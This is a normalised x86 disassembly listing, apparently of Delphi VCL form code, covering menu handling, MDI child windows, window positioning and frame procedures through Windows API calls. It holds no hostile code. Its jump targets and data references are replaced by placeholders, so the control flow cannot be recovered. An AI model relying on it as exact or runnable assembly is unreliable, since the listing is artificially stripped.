push eax
call SendMessageA
test bl bl
je r-xdata
call sub_431898
mov edi eax
mov eax ebp
call sub_443be8
push eax
call DrawMenuBar
sub_451e80
push ebx
mov ebx edx
mov [ eax + 0x2a8 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41db30
xor edx edx
mov eax ebx
call sub_433310
sub_451ea4
push ebx
mov ebx eax
cmp edx [ ebx + 0x2a0 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2a0 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_451e04
mov eax edx
mov edx ebx
call sub_41db30
sub_451ecc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4520e0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_455fd4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_43510c
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_455fc0
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41db30
mov [ ebx + 0x290 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_455fc0
cmp esi [ eax + 0x290 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
mov eax ebx
call sub_443f88
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x276 ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_443be8
push eax
call SetMenu
mov eax [ ebx + 0x290 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax ebx
call sub_451e04
cmp [ ebx + 0x298 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4534a4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4520e7
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov eax [ ebx + 0x290 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_443be8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443be8
push eax
call SetWindowPos
push 0x0
xor ecx ecx
mov edx 0x85
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xf
mov eax ebx
call sub_43d400
push 0x0
mov eax ebx
call sub_443be8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_443be8
mov edx eax
mov eax esi
call sub_43510c
jmp r-xdata
mov eax [ ebx + 0x290 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_443be8
push eax
call SetMenu
sub_452154
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4520f0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x2a4 ] esi
cmp [ ebx + 0x2a4 ] 0x0
je r-xdata
sub_4521a4
push ebx
mov ebx eax
cmp dl [ ebx + 0x330 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x330 ] dl
cmp dl 0x1
jne r-xdata
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
cmp [ ebx + 0x334 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_4521f8
mov eax ebx
call sub_4408ec
sub_4521f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x334 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x334 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41dd70
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41db30
mov [ ebx + 0x330 ] 0x2
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4408ec
sub_452264
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_452258
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x2a4 ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x2a4 ] eax
sub_4522d0
push ebx
mov ebx eax
mov eax ebx
call sub_4431d0
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4522b8
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4522b8
mov edx eax
mov eax ebx
call sub_43c2e8
mov edx 0xff00000f
mov eax ebx
call sub_43c2e8
pop ebx
retn
sub_452354
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x273 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x273 ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1da ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_443be8
push eax
call ShowWindow
sub_452394
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx + 0x279 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
movzx eax [ ebx + 0x279 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_451bac
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_451bac
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_455fa4
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_456ea0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_451bac
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455f90
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_455fa4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x278 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_455f90
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c54
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c3c
mov ebp eax
mov eax ebx
call sub_4506d8
add ebp eax
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_455f90
call sub_455c3c
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c3c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c88
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c54
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c3c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c88
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c70
push eax
mov eax ebx
call sub_4506f8
pop edx
add edx eax
push edx
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_455f90
call sub_455c70
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c54
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c3c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c88
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c3c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c88
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_455f90
call sub_455c54
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc eax 0x0
sub_4526f8
push ebx
push esi
mov esi eax
push esi
call GetParent
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
and eax 0x80
cmp eax 0x80
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
test ebx ebx
je r-xdata
push esi
call GetParent
mov ebx eax
mov eax [ rw-data ]
mov ebx [ eax + 0x30 ]
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
test al 0x80
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_443be8
mov ebx eax
jmp r-xdata
sub_452768
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov edx ebp
mov eax edi
call sub_44f474
mov edx ebp
mov eax edi
call sub_455750
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ ebp + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x1c4 ] 0x0
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
xor ebx ebx
test [ edi + 0x1c ] 0x10
je r-xdata
movzx eax [ edi + 0x278 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ ebp + 0x4 ] 0xcf0000
jmp r-xdata
test [ edi + 0x358 ] 0x8
je r-xdata
mov al 0x2
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0x4 ]
mov eax edi
mov si 0xffa9
call sub_404160
movzx eax [ edi + 0x271 ]
cmp [ edi + 0x277 ] 0x1
jne r-xdata
mov [ ebp + 0xc ] 0x80000000
mov [ ebp + 0x10 ] 0x80000000
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x277 ] 0x0
jne r-xdata
cmp [ edi + 0x330 ] 0x0
jne r-xdata
mov esi [ edi + 0x340 ]
test esi esi
jne r-xdata
mov edx eax
sub dl 0x2
je r-xdata
mov edx eax
test dl dl
je r-xdata
xor eax eax
movzx eax [ edi + 0x330 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ edi + 0x344 ]
test eax eax
je r-xdata
cmp [ edi + 0x344 ] 0x0
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
sub dl 0x3
jne r-xdata
mov al 0x2
sub dl 0x3
jne r-xdata
mov ebx esi
mov eax esi
call sub_443be8
mov [ ebp + 0x1c ] eax
mov [ ebp + 0x1c ] eax
jmp r-xdata
sub al 0x1
jb r-xdata
movzx edx [ edi + 0x278 ]
sub dl 0x1
je r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
sub al 0x3
jae r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov eax ebx
call sub_452104
mov edx edi
call sub_416824
test eax eax
jge r-xdata
test ebx ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ ebp + 0x1c ] eax
jmp r-xdata
je r-xdata
mov [ ebp + 0x14 ] 0x80000000
mov [ ebp + 0x18 ] 0x80000000
sub dl 0x2
jne r-xdata
mov [ edi + 0x273 ] 0x0
test [ edi + 0x1c ] 0x10
jne r-xdata
and [ ebp + 0x4 ] 0xbffcffff
mov [ edi + 0x344 ] eax
mov edx ebx
mov eax edi
call sub_41db30
mov [ edi + 0x340 ] ebx
jmp r-xdata
mov eax ebx
call sub_452104
mov edx edi
call sub_416668
mov eax [ rw-data ]
call sub_459e2c
mov [ ebp + 0x1c ] eax
cmp [ ebp + 0x1c ] 0x0
je r-xdata
dec al
je r-xdata
cmp [ edi + 0x277 ] 0x1
jne r-xdata
and [ ebp + 0x4 ] 0xff3fffff
test [ edi + 0x1d ] 0x2
je r-xdata
movzx eax [ edi + 0x273 ]
cmp al 0x1
jne r-xdata
mov esi [ ebp + 0x1c ]
test esi esi
je r-xdata
mov eax [ ebp + 0x1c ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov esi [ edi + 0x334 ]
test esi esi
je r-xdata
jmp r-xdata
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0x4 ]
mov eax edi
mov si 0xffaa
call sub_404160
mov eax DefMDIChildProcA
mov [ ebp + 0x28 ] eax
cmp al 0x2
jne r-xdata
or [ ebp + 0x4 ] 0x20000000
jmp r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
push 0xffffffec
push esi
call GetWindowLongA
and eax 0x80
cmp eax 0x80
jne r-xdata
xor eax eax
mov [ ebp + 0x1c ] eax
mov eax [ ebp + 0x1c ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_459e74
mov [ ebp + 0x1c ] eax
test [ edi + 0x1c ] 0x10
jne r-xdata
or [ ebp + 0x4 ] 0x1000000
jmp r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
call sub_4526f8
mov [ ebp + 0x1c ] eax
mov eax [ ebp + 0x1c ]
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov eax esi
call sub_443be8
mov [ ebp + 0x1c ] eax
mov ebx [ edi + 0x334 ]
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ ebp + 0x1c ] eax
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp eax [ edx + 0x1b4 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ ebp + 0x1c ] eax
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x44 ]
cmp eax [ edx + 0x1b4 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + 0x6c ]
jmp r-xdata
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
jmp r-xdata
sub_452aa8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44f484
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax [ ebx + 0x338 ]
test eax eax
je r-xdata
movzx eax [ ebx + 0x277 ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_443be8
push eax
call SendMessageA
mov eax ebx
call sub_453618
push eax
push 0x1
push 0x80
mov eax ebx
call sub_443be8
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebx + 0x33c ]
call sub_406250
mov edi eax
test edi edi
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x2a0 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x0
lea eax [ ebx + 0x33c ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov eax [ ebx + 0x338 ]
mov edx [ eax ]
call [ edx + 0x8 ]
inc edi
xor esi esi
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43bab4
push eax
mov eax ebx
call sub_43baf8
push eax
mov eax ebx
call sub_443be8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_407db8
mov [ ebx + 0x29c ] eax
push ebx
push sub_45125c
call sub_41eb1c
mov [ ebx + 0x2c0 ] eax
push 0xfffffffc
mov eax [ ebx + 0x29c ]
push eax
call GetWindowLongA
mov [ ebx + 0x2bc ] eax
mov eax [ ebx + 0x2c0 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x29c ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_431898
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_443be8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
mov eax [ ebx + 0x33c ]
mov eax [ eax + esi * 8 ]
push eax
push 0xb049
mov eax [ ebx + 0x33c ]
mov eax [ eax + esi * 8 + 0x4 ]
push eax
call SendMessageA
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x338 ]
call sub_4167c8
call sub_440ab4
inc esi
dec edi
jne r-xdata
sub_452c7a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_452da5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_440400
and [ ebx + 0x358 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
cmp [ eax + 0x29c ] 0x0
jne r-xdata
mov eax ebx
call sub_455628
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452dac
lea eax [ ebp - 0xb4 ]
call sub_404e44
retn
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
mov [ ebx + 0x1b4 ] eax
or [ ebx + 0x358 ] 0x10
jmp r-xdata
sub_452db4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_438b98
test eax eax
jne r-xdata
push 0x4
push ebx
call GetWindow
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call SendMessageA
sub_452df8
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440878
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
setne al
mov [ ebp - 0xc ] al
lea eax [ ebp - 0x10 ]
push eax
push sub_452db4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
xor eax eax
push ebp
push sub_452eb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_4167c8
mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_4167c8
mov dl 0x1
call sub_4450b4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_4167c8
xor edx edx
call sub_4450b4
sub_452efc
push ebx
mov ebx eax
test [ ebx + 0x358 ] 0x10
je r-xdata
mov eax ebx
call sub_44067c
push 0x0
mov eax ebx
call sub_443be8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x29c ] eax
pop ebx
retn
sub_452f40
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x29c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44145c
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x29c ]
push eax
mov eax ebx
call sub_443be8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_443be8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_452fa4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_453054
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x268 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45305b
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
test edi edi
je r-xdata
mov [ ebx + 0x268 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x276 ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
mov eax ebx
mov si 0xffaf
call sub_404160
mov eax ebx
call sub_453378
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov dl 0x1
mov eax edi
call sub_44e734
cmp ebx eax
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb6
call sub_404160
test al al
jne r-xdata
sub_453064
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x268 ]
mov eax esi
call sub_43fce0
test al al
je r-xdata
mov edx [ edi + 0x26c ]
mov eax esi
call sub_43fce0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_452fa4
mov eax [ esi + 0x30 ]
mov [ edi + 0x26c ] eax
sub_4530ac
push ebx
push esi
mov esi eax
movzx ebx [ esi + 0x276 ]
mov eax esi
call sub_452fa4
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
sub_4530d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x5 ] 0x0
inc [ rw-data ]
cmp [ edi + 0x298 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_416964
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_416844
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_416964
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_416844
jmp r-xdata
xor eax eax
mov [ edi + 0x268 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x268 ] eax
jmp r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45334d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x26c ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x26c ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x26c ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_443be8
mov dx 0xb000
call sub_44e4f4
test al al
jne r-xdata
call sub_443be8
mov ebx eax
mov eax [ rw-data ]
xor edx edx
